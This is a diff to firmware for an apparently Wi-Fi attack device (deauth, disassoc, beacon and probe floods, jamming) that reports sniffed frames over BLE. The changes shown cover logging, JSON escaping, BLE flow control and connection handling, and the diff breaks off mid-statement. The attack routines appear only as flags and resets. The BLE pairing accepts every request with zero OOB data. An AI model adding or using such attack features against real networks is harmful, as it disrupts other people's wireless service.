-    Serial.println("[INFO] Soft AP restarted: " + String(ap_ssid));
+    if (startSoftAP()) {
+      Serial.print("[INFO] Soft AP restarted: ");
+      Serial.println(ap_ssid);
+    } else if (softApActive) {
+      Serial.println("[WARN] Soft AP radio active, but WebUI port 80 failed to bind (will self-heal).");
+    } else {
+      Serial.println("[ERROR] Failed to restart Soft AP after sniff!");
+    }
   } else {
     // BLE-only stealth mode (ap off): restore STA mode so scan/TX work without broadcasting AP
     if (enterStaMode("restoreRadioAfterSniff")) {
@@ -1216,6 +1723,8 @@ void stopAllActiveAttacks() {
   beacon_flood_enabled = false;
   probe_flood_enabled = false;
   signal_jam_enabled = false;
+  deauthSlice.reset();
+  disassocSlice.reset();
   if (USE_LED) digitalWrite(LED_B, LOW);
 }
 
@@ -1231,11 +1740,13 @@ void stopConflictingModesBeforeAttack() {
 }
 
 void prepareRadioForSniff(bool turnOffAp) {
-  webServer.end();
+  stopWebServer();
   softApActive = false;
   if (turnOffAp) {
     wifi_off();
-    delay(20);
+    feedWatchdog();
+    delay(40);
+    wlanRuntimeMode = WLAN_MODE_UNINIT;
   }
 }
 
@@ -1288,27 +1799,148 @@ static void utf8SafeCopy(char *dst, size_t dstSize, const char *src) {
   dst[len] = '\0';
 }
 
+void clearSniffLogRingSafe() {
+  rtw_enter_critical(NULL, NULL);
+  logHead = 0;
+  logTail = 0;
+  droppedLogCount = 0;
+  rtw_exit_critical(NULL, NULL);
+}
+
 void pushSniffLog(const char *msg) {
   char safeMsg[LOG_STR_LEN];
   utf8SafeCopy(safeMsg, sizeof(safeMsg), msg);
+  size_t copyBytes = strlen(safeMsg) + 1;
+  if (copyBytes > LOG_STR_LEN) copyBytes = LOG_STR_LEN;
 
   rtw_enter_critical(NULL, NULL);
   uint8_t next = (logHead + 1) % LOG_RING_SIZE;
   if (next != logTail) {
-    strncpy(sniffLogRing[logHead], safeMsg, LOG_STR_LEN - 1);
-    sniffLogRing[logHead][LOG_STR_LEN - 1] = '\0';
+    memcpy(sniffLogRing[logHead], safeMsg, copyBytes);
     logHead = next;
   } else {
     droppedLogCount++;
   }
   // Also record into WebUI circular history so /api/logs can inspect captured frames
-  strncpy(webLogHistory[webLogHead], safeMsg, LOG_STR_LEN - 1);
-  webLogHistory[webLogHead][LOG_STR_LEN - 1] = '\0';
+  memcpy(webLogHistory[webLogHead], safeMsg, copyBytes);
   webLogHead = (webLogHead + 1) % WEB_LOG_HISTORY_SIZE;
   if (webLogCount < WEB_LOG_HISTORY_SIZE) {
     webLogCount++;
   }
   rtw_exit_critical(NULL, NULL);
+}
+
+size_t jsonEscapeTruncatedToBuf(const char *src, char *out, size_t outSize, size_t maxEscapedBytes, const char *ellipsis) {
+  if (!out || outSize == 0) return 0;
+  out[0] = '\0';
+  if (!src || src[0] == '\0' || maxEscapedBytes == 0) return 0;
+
+  size_t cap = outSize - 1;
+  if (maxEscapedBytes != (size_t)-1 && maxEscapedBytes < cap) {
+    cap = maxEscapedBytes;
+  }
+  size_t ellLen = (ellipsis != nullptr) ? strlen(ellipsis) : 0;
+  if (ellLen > cap) ellLen = 0;
+
+  const uint8_t *data = (const uint8_t *)src;
+  size_t srcLen = strlen(src);
+  size_t i = 0;
+  size_t pos = 0;
+  size_t lastEllipsisCut = 0;
+  bool truncated = false;
+
+  while (i < srcLen) {
+    uint8_t c = data[i];
+    if (c == 0x00) {
+      i++;
+      continue;
+    }
+
+    char seqBuf[8];
+    size_t seqLen = 0;
+    size_t consume = 1;
+
+    if (c == '"') {
+      seqBuf[0] = '\\'; seqBuf[1] = '"'; seqLen = 2;
+    } else if (c == '\\') {
+      seqBuf[0] = '\\'; seqBuf[1] = '\\'; seqLen = 2;
+    } else if (c == '\b') {
+      seqBuf[0] = '\\'; seqBuf[1] = 'b'; seqLen = 2;
+    } else if (c == '\f') {
+      seqBuf[0] = '\\'; seqBuf[1] = 'f'; seqLen = 2;
+    } else if (c == '\n') {
+      seqBuf[0] = '\\'; seqBuf[1] = 'n'; seqLen = 2;
+    } else if (c == '\r') {
+      seqBuf[0] = '\\'; seqBuf[1] = 'r'; seqLen = 2;
+    } else if (c == '\t') {
+      seqBuf[0] = '\\'; seqBuf[1] = 't'; seqLen = 2;
+    } else if (c < 0x20 || c == 0x7F) {
+      snprintf(seqBuf, sizeof(seqBuf), "\\u%04x", (unsigned)c);
+      seqLen = 6;
+    } else if (c < 0x80) {
+      seqBuf[0] = (char)c;
+      seqLen = 1;
+    } else {
+      size_t utf8Len = validUtf8CharLen(&data[i], srcLen - i);
+      if (utf8Len > 0 && utf8Len <= 4) {
+        memcpy(seqBuf, &data[i], utf8Len);
+        seqLen = utf8Len;
+        consume = utf8Len;
+      } else {
+        seqBuf[0] = '?';
+        seqLen = 1;
+        consume = 1;
+      }
+    }
+
+    if (pos + seqLen > cap) {
+      truncated = true;
+      break;
+    }
+    memcpy(out + pos, seqBuf, seqLen);
+    pos += seqLen;
+    if (pos + ellLen <= cap) {
+      lastEllipsisCut = pos;
+    }
+    i += consume;
+  }
+
+  if (truncated && ellLen > 0) {
+    pos = lastEllipsisCut;
+    memcpy(out + pos, ellipsis, ellLen);
+    pos += ellLen;
+  }
+  out[pos] = '\0';
+  return pos;
+}
+
+size_t jsonEscapeToBuf(const char *src, char *out, size_t outSize) {
+  return jsonEscapeTruncatedToBuf(src, out, outSize, (size_t)-1, "");
+}
+
+void getBleStateSafe(uint8_t &connIdOut, bool &notifyOut) {
+  rtw_enter_critical(NULL, NULL);
+  connIdOut = activeConnId;
+  notifyOut = bleNotifyEnabled;
+  rtw_exit_critical(NULL, NULL);
+}
+
+bool isBleReadyToNotifySafe(uint8_t &connIdOut) {
+  bool notifySnap = false;
+  rtw_enter_critical(NULL, NULL);
+  connIdOut = activeConnId;
+  notifySnap = bleNotifyEnabled;
+  rtw_exit_critical(NULL, NULL);
+  return (bleStarted && notifySnap && BLE.connected(connIdOut));
+}
+
+bool isBleConnectedSafe() {
+  if (!bleStarted) return false;
+  uint8_t connIdSnap = 0;
+  rtw_enter_critical(NULL, NULL);
+  connIdSnap = activeConnId;
+  rtw_exit_critical(NULL, NULL);
+  return BLE.connected(connIdSnap);
 }
 
 uint16_t getEffectiveBleAttMtu(uint8_t connId) {
@@ -1319,27 +1951,62 @@ uint16_t getEffectiveBleAttMtu(uint8_t connId) {
   return mtuSize;
 }
 
-bool waitForBleTxCredit(uint8_t connId) {
-  uint16_t remainCredits = 0;
+static bool hasBleTxCreditHeadroom(uint8_t connId, uint16_t minCredits, uint16_t maxWaitMs) {
+  static uint16_t maxSeenCredits = 0;
   unsigned long waitStart = millis();
-  while (BLE.connected(connId) && bleNotifyEnabled) {
+  while (true) {
+    uint8_t curConn = 0;
+    bool notifySnap = false;
+    getBleStateSafe(curConn, notifySnap);
+    if (!notifySnap || curConn != connId || !BLE.connected(connId)) {
+      return false;
+    }
+    uint16_t remainCredits = 0;
     if (le_get_gap_param(GAP_PARAM_LE_REMAIN_CREDITS, &remainCredits) != GAP_CAUSE_SUCCESS) {
       return true;
     }
-    if (remainCredits > 0) {
+    if (remainCredits > maxSeenCredits) {
+      maxSeenCredits = remainCredits;
+    }
+    uint16_t effectiveMin = minCredits;
+    if (maxSeenCredits > 0) {
+      if (maxSeenCredits <= 2 && effectiveMin > 1) {
+        effectiveMin = 1;
+      } else if (maxSeenCredits >= 3 && effectiveMin >= maxSeenCredits) {
+        effectiveMin = (uint16_t)(maxSeenCredits - 1);
+      }
+    }
+    if (remainCredits >= effectiveMin) {
       return true;
     }
-    if (millis() - waitStart >= 25) {
+    if (maxWaitMs == 0 || (millis() - waitStart >= maxWaitMs)) {
       return false;
     }
-    delay(2);
+    vTaskDelay(1);
   }
-  return false;
 }
 
-void bleSendLine(const String &line) {
-  uint8_t connId = activeConnId;
-  if (!BLE.connected(connId) || !bleNotifyEnabled) return;
+void resetBleLogFlowControl() {
+  bleLogBackoffMs = BLE_SNIFF_BASE_INTERVAL_MS;
+  lastBleRoutineLogMs = 0;
+  lastBlePriorityLogMs = 0;
+  rtw_enter_critical(NULL, NULL);
+  bleDroppedLogCount = 0;
+  rtw_exit_critical(NULL, NULL);
+}
+
+bool waitForBleTxCredit(uint8_t connId) {
+  return hasBleTxCreditHeadroom(connId, 1, 8);
+}
+
+bool bleSendLineCstr(const char *line, size_t lineLen, bool critical, bool isHeartbeat, uint16_t minCreditsOverride) {
+  if (!line) return false;
+  uint8_t connId = 0;
+  if (!isBleReadyToNotifySafe(connId)) return false;
+
+  // 2A + P0-2 流控：普通抓包日志预留充足 TX credit 余量以防挤死 st 心跳与 LL 监督；关键/高优先级帧用低门槛快速通告
+  uint16_t minCredits = (minCreditsOverride > 0) ? minCreditsOverride : ((!critical && !isHeartbeat) ? 2 : 1);
+  uint16_t waitMs = critical ? 8 : 0;
 
   uint16_t attMtu = getEffectiveBleAttMtu(connId);
   size_t mtuCap = (attMtu > 3) ? (size_t)(attMtu - 3) : 20;
@@ -1348,77 +2015,500 @@ void bleSendLine(const String &line) {
   size_t maxChunk = (mtuCap < bufCap) ? mtuCap : bufCap;
   if (maxChunk == 0) maxChunk = 20;
 
-  String payload = line + "\n";
-  const uint8_t *raw = (const uint8_t *)payload.c_str();
-  size_t total = payload.length();
+  static char txScratch[384];
+  bool useScratch = (lineLen + 1 <= sizeof(txScratch));
+  if (useScratch) {
+    memcpy(txScratch, line, lineLen);
+    txScratch[lineLen] = '\n';
+  }
+  size_t total = useScratch ? (lineLen + 1) : lineLen;
   size_t offset = 0;
-  static uint8_t bleBurstCount = 0;
 
   while (offset < total) {
-    if (!BLE.connected(connId) || !bleNotifyEnabled) return;
+    if (!hasBleTxCreditHeadroom(connId, minCredits, waitMs)) {
+      return false;
+    }
     size_t chunkLen = total - offset;
     if (chunkLen > maxChunk) chunkLen = maxChunk;
 
-    waitForBleTxCredit(connId);
-    if (!BLE.connected(connId) || !bleNotifyEnabled) return;
-    if (!BleTx.setData((uint8_t *)(raw + offset), (uint16_t)chunkLen)) {
+    uint8_t *chunkPtr = nullptr;
+    if (useScratch) {
+      chunkPtr = (uint8_t *)(txScratch + offset);
+    } else {
+      static uint8_t fallbackChunk[248];
+      if (chunkLen > sizeof(fallbackChunk)) chunkLen = sizeof(fallbackChunk);
+      memcpy(fallbackChunk, line + offset, chunkLen);
+      chunkPtr = fallbackChunk;
+    }
+    if (!BleTx.setData(chunkPtr, (uint16_t)chunkLen)) {
       Serial.println("[BLE] BleTx.setData failed");
-      return;
+      return false;
     }
     BleTx.notify(connId);
     offset += chunkLen;
-    bleBurstCount++;
     if (offset < total) {
-      delay(2);
-    } else if ((bleBurstCount & 0x03) == 0) {
-      delay(1);
+      feedWatchdog();
+      vTaskDelay(1);
     }
+  }
+
+  if (!useScratch) {
+    if (!hasBleTxCreditHeadroom(connId, minCredits, waitMs)) {
+      return false;
+    }
+    uint8_t nl = '\n';
+    if (!BleTx.setData(&nl, 1)) return false;
+    BleTx.notify(connId);
+  }
+  return true;
+}
+
+void bleSendLine(const String &line) {
+  bleSendLineCstr(line.c_str(), line.length(), true, false, 0);
+}
+
+bool bleSendSniffLog(const char *msg, bool highPriority) {
+  if (!msg || msg[0] == '\0') return true;
+  uint8_t connId = 0;
+  if (!isBleReadyToNotifySafe(connId)) return false;
+  char esc[240];
+  jsonEscapeTruncatedToBuf(msg, esc, sizeof(esc), 180, "...");
+  char line[280];
+  int n = snprintf(line, sizeof(line), "{\"t\":\"log\",\"m\":\"%s\"}", esc);
+  if (n <= 0 || (size_t)n >= sizeof(line)) return false;
+  // Routine logs require >=3 free credits (auto-capped on smaller pools) to leave headroom for heartbeat/control;
+  // high-priority security alerts (EAPOL/Deauth/Disassoc/Pwnagotchi) require >=1 credit.
+  uint16_t minCredits = highPriority ? 1 : 3;
+  return bleSendLineCstr(line, (size_t)n, false, highPriority, minCredits);
+}
+
+void bleSendLog(const char *msg) {
+  if (!msg || msg[0] == '\0') return;
+  uint8_t connId = 0;
+  if (!isBleReadyToNotifySafe(connId)) return;
+  if (!bleSendSniffLog(msg, false)) {
+    rtw_enter_critical(NULL, NULL);
+    bleDroppedLogCount++;
+    rtw_exit_critical(NULL, NULL);
   }
 }
 
 void bleSendLog(const String &msg) {
-  if (!BLE.connected(activeConnId) || !bleNotifyEnabled) return;
-  String escaped = jsonEscapeTruncated(msg, 180, "...");
-  bleSendLine(String("{\"t\":\"log\",\"m\":\"") + escaped + "\"}");
+  bleSendLog(msg.c_str());
 }
 
 void bleWriteCB(BLECharacteristic* chr, uint8_t connID) {
+  if (!chr) return;
+  uint16_t rawLen = chr->getDataLen();
+  const uint8_t *rawBuf = chr->getDataBuff();
+  rtw_enter_critical(NULL, NULL);
   activeConnId = connID;
-  if (chr->getDataLen() > 0) {
-    String cmd = chr->readString();
-    cmd.trim();
-    if (cmd.length() > 0) {
-      if (isStopCmdCstr(cmd.c_str())) {
-        rtw_enter_critical(NULL, NULL);
-        emergencyStopRequested = true;
-        priorityStopPending = true;
-        cmdHead = cmdTail;  // 急停清空此前排队的未消费 BLE 指令
-        rtw_exit_critical(NULL, NULL);
-        return;
+  rtw_exit_critical(NULL, NULL);
+  if (!rawBuf || rawLen == 0) return;
+
+  // #7：BLE_Peripheral_Task 栈仅 1024B，严禁调用 readString()；使用 static 缓冲安全裁剪
+  uint16_t start = 0;
+  while (start < rawLen && (rawBuf[start] == ' ' || rawBuf[start] == '\t' || rawBuf[start] == '\r' || rawBuf[start] == '\n')) {
+    start++;
+  }
+  uint16_t end = rawLen;
+  while (end > start && (rawBuf[end - 1] == ' ' || rawBuf[end - 1] == '\t' || rawBuf[end - 1] == '\r' || rawBuf[end - 1] == '\n')) {
+    end--;
+  }
+  uint16_t trimmedLen = end - start;
+  if (trimmedLen == 0) return;
+  if (trimmedLen >= BLE_BUF_SIZE) {
+    rtw_enter_critical(NULL, NULL);
+    bleCmdOversizeDrop = true;
+    rtw_exit_critical(NULL, NULL);
+    return;
+  }
+
+  static char rxScratch[BLE_BUF_SIZE];
+  memcpy(rxScratch, rawBuf + start, trimmedLen);
+  rxScratch[trimmedLen] = '\0';
+
+  if (isStopCmdCstr(rxScratch)) {
+    rtw_enter_critical(NULL, NULL);
+    emergencyStopRequested = true;
+    priorityStopPending = true;
+    cmdHead = cmdTail;  // 急停清空此前排队的未消费 BLE 指令
+    rtw_exit_critical(NULL, NULL);
+    return;
+  }
+
+  rtw_enter_critical(NULL, NULL);
+  uint8_t next = (cmdHead + 1) % CMD_RING_SIZE;
+  if (next != cmdTail) {
+    memcpy(cmdRing[cmdHead], rxScratch, trimmedLen + 1);
+    cmdHead = next;  // only advance the ring, never block the BLE task
+  } else {
+    bleCmdQueueOverflow = true;
+  }
+  rtw_exit_critical(NULL, NULL);
+}
+
+void bleNotifCB(BLECharacteristic* /*chr*/, uint8_t connID, uint16_t cccd) {
+  bool enabled = ((cccd & GATT_CLIENT_CHAR_CONFIG_NOTIFY) != 0);
+  rtw_enter_critical(NULL, NULL);
+  activeConnId = connID;
+  bleNotifyEnabled = enabled;
+  rtw_exit_critical(NULL, NULL);
+}
+
+// 1-OptB GAP App 回调（运行在 1024B 栈的 BLE_Peripheral_Task 中：严禁大栈变量/Serial/String）
+static T_APP_RESULT appGapCallback(uint8_t cb_type, void *p_cb_data) {
+  T_APP_RESULT result = APP_RESULT_SUCCESS;
+  if (!p_cb_data) return result;
+  T_LE_CB_DATA cb_data;
+  memcpy(&cb_data, p_cb_data, sizeof(T_LE_CB_DATA));
+
+  switch (cb_type) {
+    case GAP_MSG_LE_GAP_STATE_MSG: {
+      T_IO_MSG *p_gap_msg = (T_IO_MSG *)cb_data.p_gap_state_msg;
+      if (!p_gap_msg) break;
+      T_LE_GAP_MSG gap_msg;
+      memset(&gap_msg, 0, sizeof(gap_msg));
+      memcpy(&gap_msg, &p_gap_msg->u.param, sizeof(p_gap_msg->u.param));
+
+      switch (p_gap_msg->subtype) {
+        case GAP_MSG_LE_DEV_STATE_CHANGE: {
+          T_GAP_DEV_STATE ns = gap_msg.msg_data.gap_dev_state_change.new_state;
+          if (ns.gap_init_state == GAP_INIT_STATE_STACK_READY &&
+              ns.gap_adv_state == GAP_ADV_STATE_IDLE &&
+              ns.gap_conn_state == GAP_CONN_DEV_STATE_IDLE &&
+              !bleAdvUpdateInProgress &&
+              bleGapConnState == GAP_CONN_STATE_DISCONNECTED) {
+            le_adv_start();
+          }
+          break;
+        }
+        case GAP_MSG_LE_CONN_STATE_CHANGE: {
+          uint8_t cid = gap_msg.msg_data.gap_conn_state_change.conn_id;
+          T_GAP_CONN_STATE newState = (T_GAP_CONN_STATE)gap_msg.msg_data.gap_conn_state_change.new_state;
+          uint16_t discCause = gap_msg.msg_data.gap_conn_state_change.disc_cause;
+          bleGapConnState = newState;
+
+          if (newState == GAP_CONN_STATE_DISCONNECTED) {
+            rtw_enter_critical(NULL, NULL);
+            if (cid == activeConnId) {
+              bleNotifyEnabled = false;
+            }
+            bleGapDiag.discConnId = cid;
+            bleGapDiag.discCause = discCause;
+            bleGapDiag.negotiatePending = false;
+            bleGapDiag.phyReassertDone = false;
+            bleGapDiag.phyReassertAttempts = 0;
+            bleGapDiag.lastPhyReqMs = 0;
+            bleGapDiag.evDisconnected = true;
+            rtw_exit_critical(NULL, NULL);
+            if (!bleAdvUpdateInProgress) {
+              le_adv_start();
+            }
+          } else if (newState == GAP_CONN_STATE_CONNECTED) {
+            uint16_t ci = 0, cl = 0, ct = 0;
+            uint8_t tp = 0, rp = 0;
+            le_get_conn_param(GAP_PARAM_CONN_INTERVAL, &ci, cid);
+            le_get_conn_param(GAP_PARAM_CONN_LATENCY, &cl, cid);
+            le_get_conn_param(GAP_PARAM_CONN_TIMEOUT, &ct, cid);
+            le_get_conn_param(GAP_PARAM_CONN_TX_PHY_TYPE, &tp, cid);
+            le_get_conn_param(GAP_PARAM_CONN_RX_PHY_TYPE, &rp, cid);
+
+            rtw_enter_critical(NULL, NULL);
+            activeConnId = cid;
+            bleNotifyEnabled = false;
+            bleGapDiag.connId = cid;
+            bleGapDiag.initInterval = ci;
+            bleGapDiag.initLatency = cl;
+            bleGapDiag.initTimeout = ct;
+            bleGapDiag.initTxPhy = tp;
+            bleGapDiag.initRxPhy = rp;
+            bleGapDiag.phyCause = 0;
+            bleGapDiag.phyTx = tp;
+            bleGapDiag.phyRx = rp;
+            bleGapDiag.mtuSize = 23;
+            bleGapDiag.negotiatePending = true;
+            bleGapDiag.negotiateAttempts = 0;
+            bleGapDiag.connectedAtMs = millis();
+            bleGapDiag.lastNegotiateMs = 0;
+            bleGapDiag.phyReassertDone = false;
+            bleGapDiag.phyReassertAttempts = 0;
+            bleGapDiag.lastPhyReqMs = 0;
+            bleGapDiag.evConnected = true;
+            rtw_exit_critical(NULL, NULL);
+
+            // 1A: 连接建立后主动请求 1M PHY 提升灵敏度及 2.4GHz Wi-Fi 共存稳定性
+            le_set_phy(cid, GAP_PHYS_PREFER_ALL, GAP_PHYS_PREFER_1M_BIT, GAP_PHYS_PREFER_1M_BIT, GAP_PHYS_OPTIONS_CODED_PREFER_NO);
+          }
+          break;
+        }
+        case GAP_MSG_LE_CONN_PARAM_UPDATE: {
+          uint8_t cid = gap_msg.msg_data.gap_conn_param_update.conn_id;
+          uint8_t status = gap_msg.msg_data.gap_conn_param_update.status;
+          uint16_t cause = gap_msg.msg_data.gap_conn_param_update.cause;
+          if (status == GAP_CONN_PARAM_UPDATE_STATUS_SUCCESS) {
+            uint16_t ci = 0, cl = 0, ct = 0;
+            le_get_conn_param(GAP_PARAM_CONN_INTERVAL, &ci, cid);
+            le_get_conn_param(GAP_PARAM_CONN_LATENCY, &cl, cid);
+            le_get_conn_param(GAP_PARAM_CONN_TIMEOUT, &ct, cid);
+            rtw_enter_critical(NULL, NULL);
+            bleGapDiag.updInterval = ci;
+            bleGapDiag.updLatency = cl;
+            bleGapDiag.updTimeout = ct;
+            bleGapDiag.evParamUpdated = true;
+            rtw_exit_critical(NULL, NULL);
+          } else if (status == GAP_CONN_PARAM_UPDATE_STATUS_FAIL) {
+            rtw_enter_critical(NULL, NULL);
+            bleGapDiag.paramFailCause = cause;
+            bleGapDiag.evParamUpdateFailed = true;
+            rtw_exit_critical(NULL, NULL);
+          }
+          break;
+        }
+        case GAP_MSG_LE_CONN_MTU_INFO: {
+          rtw_enter_critical(NULL, NULL);
+          bleGapDiag.mtuConnId = gap_msg.msg_data.gap_conn_mtu_info.conn_id;
+          bleGapDiag.mtuSize = gap_msg.msg_data.gap_conn_mtu_info.mtu_size;
+          bleGapDiag.evMtuUpdated = true;
+          rtw_exit_critical(NULL, NULL);
+          break;
+        }
+        case GAP_MSG_LE_BOND_PASSKEY_DISPLAY: {
+          le_bond_passkey_display_confirm(gap_msg.msg_data.gap_bond_passkey_display.conn_id, GAP_CFM_CAUSE_ACCEPT);
+          break;
+        }
+        case GAP_MSG_LE_BOND_PASSKEY_INPUT: {
+          le_bond_passkey_input_confirm(gap_msg.msg_data.gap_bond_passkey_input.conn_id, 0, GAP_CFM_CAUSE_ACCEPT);
+          break;
+        }
+        case GAP_MSG_LE_BOND_OOB_INPUT: {
+          static uint8_t zeroOob[GAP_OOB_LEN] = {0};
+          uint8_t cid = gap_msg.msg_data.gap_bond_oob_input.conn_id;
+          le_bond_set_param(GAP_PARAM_BOND_OOB_DATA, GAP_OOB_LEN, zeroOob);
+          le_bond_oob_input_confirm(cid, GAP_CFM_CAUSE_ACCEPT);
+          break;
+        }
+        case GAP_MSG_LE_BOND_USER_CONFIRMATION: {
+          le_bond_user_confirm(gap_msg.msg_data.gap_bond_user_conf.conn_id, GAP_CFM_CAUSE_ACCEPT);
+          break;
+        }
+        case GAP_MSG_LE_BOND_JUST_WORK: {
+          le_bond_just_work_confirm(gap_msg.msg_data.gap_bond_just_work_conf.conn_id, GAP_CFM_CAUSE_ACCEPT);
+          break;
+        }
+        default:
+          break;
       }
-      if (cmd.length() >= BLE_BUF_SIZE) {
+      break;
+    }
+    case GAP_MSG_LE_CONN_UPDATE_IND: {
+      if (cb_data.p_le_conn_update_ind) {
+        uint16_t cmin = cb_data.p_le_conn_update_ind->conn_interval_min;
+        uint16_t cmax = cb_data.p_le_conn_update_ind->conn_interval_max;
+        uint16_t clat = cb_data.p_le_conn_update_ind->conn_latency;
+        uint16_t ctout = cb_data.p_le_conn_update_ind->supervision_timeout;
+        // 1C: 拦截过紧的连接参数请求（interval < 30ms、supv_tout < 2000ms 或 latency > 10）
+        bool reject = (cmin < 24 || ctout < 200 || clat > 10);
+        result = reject ? APP_RESULT_REJECT : APP_RESULT_ACCEPT;
         rtw_enter_critical(NULL, NULL);
-        bleCmdOversizeDrop = true;
+        bleGapDiag.indMin = cmin;
+        bleGapDiag.indMax = cmax;
+        bleGapDiag.indLat = clat;
+        bleGapDiag.indTout = ctout;
+        bleGapDiag.indRejected = reject;
+        bleGapDiag.evConnUpdateInd = true;
+        if (reject) {
+          bleGapDiag.negotiatePending = true;
+        }
         rtw_exit_critical(NULL, NULL);
-        return;
       }
+      break;
+    }
+    case GAP_MSG_LE_PHY_UPDATE_INFO: {
+      if (cb_data.p_le_phy_update_info) {
+        rtw_enter_critical(NULL, NULL);
+        bleGapDiag.phyCause = cb_data.p_le_phy_update_info->cause;
+        bleGapDiag.phyTx = (uint8_t)cb_data.p_le_phy_update_info->tx_phy;
+        bleGapDiag.phyRx = (uint8_t)cb_data.p_le_phy_update_info->rx_phy;
+        bleGapDiag.evPhyUpdated = true;
+        rtw_exit_critical(NULL, NULL);
+      }
+      break;
+    }
+    default:
+      break;
+  }
+  return result;
+}
+
+void processBleDiagAndNegotiation() {
+  BleGapTelemetry snap;
+  uint32_t droppedLogs = 0;
+  unsigned long nowMs = millis();
+
+  rtw_enter_critical(NULL, NULL);
+  snap = bleGapDiag;
+  bleGapDiag.evConnected = false;
+  bleGapDiag.evDisconnected = false;
+  bleGapDiag.evParamUpdated = false;
+  bleGapDiag.evParamUpdateFailed = false;
+  bleGapDiag.evPhyUpdated = false;
+  bleGapDiag.evMtuUpdated = false;
+  bleGapDiag.evConnUpdateInd = false;
+  if (bleDroppedLogCount > 0 && (nowMs - lastBleDroppedWarnMs >= 5000)) {
+    droppedLogs = bleDroppedLogCount;
+    bleDroppedLogCount = 0;
+    lastBleDroppedWarnMs = nowMs;
+  }
+  rtw_exit_critical(NULL, NULL);
+
+  if (snap.evConnected) {
+    char buf[128];
+    snprintf(buf, sizeof(buf),
+             "[BLE] Connected conn=%u int=%ums lat=%u tout=%ums phy=%u/%u",
+             (unsigned)snap.connId,
+             (unsigned)(snap.initInterval * 5U / 4U),
+             (unsigned)snap.initLatency,
+             (unsigned)(snap.initTimeout * 10U),
+             (unsigned)snap.initTxPhy,
+             (unsigned)snap.initRxPhy);
+    Serial.println(buf);
+  }
+  if (snap.evDisconnected) {
+    cancelBleScanPush();
+    clearSniffLogRingSafe();
+    resetBleLogFlowControl();
+    char buf[80];
+    snprintf(buf, sizeof(buf), "[BLE] Disconnected conn=%u disc_cause=0x%04X",
+             (unsigned)snap.discConnId, (unsigned)snap.discCause);
+    Serial.println(buf);
+  }
+  if (snap.evMtuUpdated) {
+    char buf[64];
+    snprintf(buf, sizeof(buf), "[BLE] ATT MTU=%u (conn=%u)",
+             (unsigned)snap.mtuSize, (unsigned)snap.mtuConnId);
+    Serial.println(buf);
+  }
+  if (snap.evPhyUpdated) {
+    char buf[80];
+    snprintf(buf, sizeof(buf), "[BLE] PHY updated cause=0x%04X tx=%u rx=%u",
+             (unsigned)snap.phyCause, (unsigned)snap.phyTx, (unsigned)snap.phyRx);
+    Serial.println(buf);
+  }
+  if (snap.evConnUpdateInd) {
+    char buf[112];
+    snprintf(buf, sizeof(buf),
+             "[BLE] Peer ConnParamReq %u-%ums lat=%u tout=%ums -> %s",
+             (unsigned)(snap.indMin * 5U / 4U),
+             (unsigned)(snap.indMax * 5U / 4U),
+             (unsigned)snap.indLat,
+             (unsigned)(snap.indTout * 10U),
+             snap.indRejected ? "REJECT" : "ACCEPT");
+    Serial.println(buf);
+  }
+  if (snap.evParamUpdated) {
+    char buf[96];
+    snprintf(buf, sizeof(buf), "[BLE] ConnParam active int=%ums lat=%u tout=%ums",
+             (unsigned)(snap.updInterval * 5U / 4U),
+             (unsigned)snap.updLatency,
+             (unsigned)(snap.updTimeout * 10U));
+    Serial.println(buf);
+  }
+  if (snap.evParamUpdateFailed) {
+    char buf[64];
+    snprintf(buf, sizeof(buf), "[BLE] ConnParam update fail cause=0x%04X",
+             (unsigned)snap.paramFailCause);
+    Serial.println(buf);
+  }
+  if (droppedLogs > 0) {
+    char buf[96];
+    snprintf(buf, sizeof(buf), "[BLE] Dropped %lu non-critical log frames (TX congestion)",
+             (unsigned long)droppedLogs);
+    Serial.println(buf);
+  }
+
+  // 1C: 连接建立 1.5s 后（避开 Android 初始快速服务发现窗口）协商稳健容错连接参数
+  if (snap.negotiatePending && BLE.connected(snap.connId) && (nowMs - snap.connectedAtMs >= 1500)) {
+    uint16_t curInt = 0, curLat = 0, curTout = 0;
+    le_get_conn_param(GAP_PARAM_CONN_INTERVAL, &curInt, snap.connId);
+    le_get_conn_param(GAP_PARAM_CONN_LATENCY, &curLat, snap.connId);
+    le_get_conn_param(GAP_PARAM_CONN_TIMEOUT, &curTout, snap.connId);
+    if (curInt >= 36 && curInt <= 72 && curLat >= 4 && curLat <= 6 && curTout >= 500) {
       rtw_enter_critical(NULL, NULL);
-      uint8_t next = (cmdHead + 1) % CMD_RING_SIZE;
-      if (next != cmdTail) {
-        strncpy(cmdRing[cmdHead], cmd.c_str(), sizeof(cmdRing[0]) - 1);
-        cmdRing[cmdHead][sizeof(cmdRing[0]) - 1] = '\0';
-        cmdHead = next;  // only advance the ring, never block the BLE task
-      } else {
-        bleCmdQueueOverflow = true;
+      bleGapDiag.negotiatePending = false;
+      rtw_exit_critical(NULL, NULL);
+    } else if (snap.negotiateAttempts < 2 &&
+               (snap.lastNegotiateMs == 0 || (nowMs - snap.lastNegotiateMs >= 3000))) {
+      // 目标: interval 45-90ms (36..72*1.25ms), latency 4, supv_tout 6000ms (600*10ms)
+      uint16_t targetTout = (snap.negotiateAttempts == 0) ? 600 : 500;
+      T_GAP_CAUSE cause = le_update_conn_param(snap.connId, 36, 72, 4, targetTout, 70, 142);
+      rtw_enter_critical(NULL, NULL);
+      bleGapDiag.negotiateAttempts++;
+      bleGapDiag.lastNegotiateMs = nowMs;
+      if (bleGapDiag.negotiateAttempts >= 2) {
+        bleGapDiag.negotiatePending = false;
       }
       rtw_exit_critical(NULL, NULL);
+      if (cause != GAP_CAUSE_SUCCESS) {
+        Serial.print("[BLE] le_update_conn_param cause=");
+        Serial.println((int)cause);
+      }
+    }
+  }
+
+  // P1-2: Bounded per-connection 1M PHY protection in main loop (NEVER inside 1024B BLE_Peripheral_Task).
+  // Android 16 (Xiaomi) negotiates 1M initially, then proactively upgrades to 2M (tx=2 rx=2) for air efficiency.
+  // Rationale & Risk Control:
+  // - Never re-request inside GAP_MSG_LE_PHY_UPDATE_INFO: unbounded replies cause a 1M<->2M ping-pong loop
+  //   that saturates LL control frames and risks LMP timeout (0x0122) or 0x0108 disconnects.
+  // - Wait >= 2000ms post-connect and until ConnParam negotiation finishes so initial GATT/MTU discovery settles.
+  // - Issue AT MOST 1 gentle 1M re-suggestion per connection (`phyReassertAttempts < 1`). If peer accepts 1M,
+  //   we gain ~3-5dB link budget under 2.4GHz coex; if peer insists on 2M, we accept 2M cleanly without looping.
+  if (!snap.negotiatePending &&
+      !snap.phyReassertDone &&
+      snap.phyReassertAttempts < 1 &&
+      BLE.connected(snap.connId) &&
+      (nowMs - snap.connectedAtMs >= 2000)) {
